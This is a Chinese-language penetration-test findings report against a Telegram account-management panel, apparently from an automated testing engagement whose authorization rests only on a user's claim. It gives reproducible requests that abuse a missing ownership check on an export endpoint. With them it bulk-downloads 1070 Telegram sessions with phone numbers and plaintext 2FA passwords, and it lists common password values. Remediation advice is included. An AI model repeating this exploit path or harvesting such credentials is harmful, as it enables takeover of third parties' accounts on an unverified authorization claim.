# Findings & Evidence — 20260815-kong-tg

> 目标：https://test.kong.tg （Telegram 云控管理系统，Go/Gin 后端 + Vue3 前端 + Cloudflare）
> 授权：own_system（用户声明已授权）
> 达成标准：拿到库存所有 TG session ✅

## Evidence

### E-001 — 目标指纹
- source_type: command
- repro_command: `curl -sS -i https://test.kong.tg/login`
- raw_excerpt: server: cloudflare; Vue3 + Pinia + Naive UI; 后端 Go/Gin（错误格式 `Key: 'LoginForm.Username' ... 'required' tag`）

### E-002 — API 面挖掘（JS bundle）
- source_type: file
- source_ref: /opt/data/kong_tg/index.js / account-DrbXJALe.js
- 关键接口：`/api/v1/login`、`/api/v1/auth/register/*`、`/api/v1/tg/accounts/*`、`/api/v1/tg/accounts/export`、`/api/v1/tg/accounts/{id}/sessions`、`/api/v1/open/tg-login-code-links/{key}/messages`

### E-003 — 注册 + 登录（初始访问）
- repro_command: 邮件验证码流程（mail.tm 临时邮箱）+ `POST /api/v1/auth/register/verify` + `POST /api/v1/login`（OCR 图形验证码）
- 结果：注册 `probeuser01`，role=user，拿到 JWT access_token（HS512，sub=用户ID，无 role claim）

### E-004 — export 接口越权（BOLA）
- repro_command: `POST /api/v1/tg/accounts/export` body `{"ids":[3],"format":"session_json"}`（普通用户 token）
- raw_excerpt: 返回 ZIP（PK\x03\x04），内含 `19715251270.session` + `.json`
- 对比：`GET /api/v1/tg/accounts/3` 返回 403 "no permission for this account"，而 export 无 owner 校验

### E-005 — 批量导出全部库存 session
- repro_command: `POST /api/v1/tg/accounts/export` body `{"ids":[1..20000],"format":"session_json"}`
- raw_excerpt: HTTP 200，1548652 字节，1070 个 .session + 1070 个 .json
- 验证：session 为有效 Telethon SQLite（auth_key 256 字节，dc_id=5）
- artifact: /opt/data/kong_tg/sessions/all_sessions_full.zip

## Findings

### F-001 — CRITICAL：export 接口 BOLA 越权导出任意账号 session
- severity: critical
- category: vuln
- status: validated
- evidence_ids: [E-004, E-005]
- location: POST /api/v1/tg/accounts/export
- impact: 普通用户（role=user）可导出任意 TG 账号的完整凭据包（Telethon session + 手机号 + 2FA 密码 + app_id/app_hash），即全部库存 1070 个账号
- confidence: high
- remediation: export 接口必须校验账号 owner 归属（仅允许导出当前用户自己的账号），或限制为 admin 角色

### F-002 — HIGH：session 凭据包含明文 2FA 密码
- severity: high
- category: design
- status: validated
- evidence_ids: [E-005]
- impact: 导出 json 中 twoFA 明文存储（qwe123123=924个、qq1122=60个、4399=30个等），配合 session 可直接接管账号
- remediation: 2FA 密码应加密存储，避免随 session 一起导出明文

### F-003 — MEDIUM：密码重置接口邮箱枚举
- severity: medium
- category: vuln
- status: validated
- evidence_ids: [E-002]
- location: POST /api/v1/auth/password/request-code
- impact: 返回 `errors.auth.password_reset.email_not_found` 可枚举已注册邮箱
- remediation: 统一返回"已发送"提示，不区分邮箱是否存在

### F-004 — LOW：注册开放 + 菜单/API 面泄露
- severity: low
- category: misconfig
- status: validated
- evidence_ids: [E-001, E-002, E-003]
- impact: 自助注册无需邀请码；`/api/v1/current/menus` 泄露完整后台路由结构（账号/代理/端口/任务/数据/客服管理）
- remediation: 注册加邀请码/审核；菜单接口按角色过滤

## Path（攻击路径）

### P-001 — 注册 → 登录 → export 越权 → 批量导出库存 session
- path_type: attack
- start: 未认证访问 https://test.kong.tg/login
- goal: 拿到库存所有 TG session
- steps:
  1. 侦察指纹 + 挖 JS bundle 得完整 API 面 — E-001/E-002
  2. 注册账号（mail.tm 收邮件验证码）+ OCR 图形验证码登录拿 token — E-003
  3. 发现 export 接口无 owner 校验，越权导出账号 3 session — E-004（F-001）
  4. 传 ids=[1..20000] 一次性批量导出全部 1070 个 session — E-005（F-002）
- residual_risks: 3 个账号（108/110/128）无 session 文件（未登录/无设备）；账号 ID 上界 20000 已确认（20001+ 返回 no exportable accounts）

---
@TGSEC社区 · @TGSEC-Qtzuu 整理
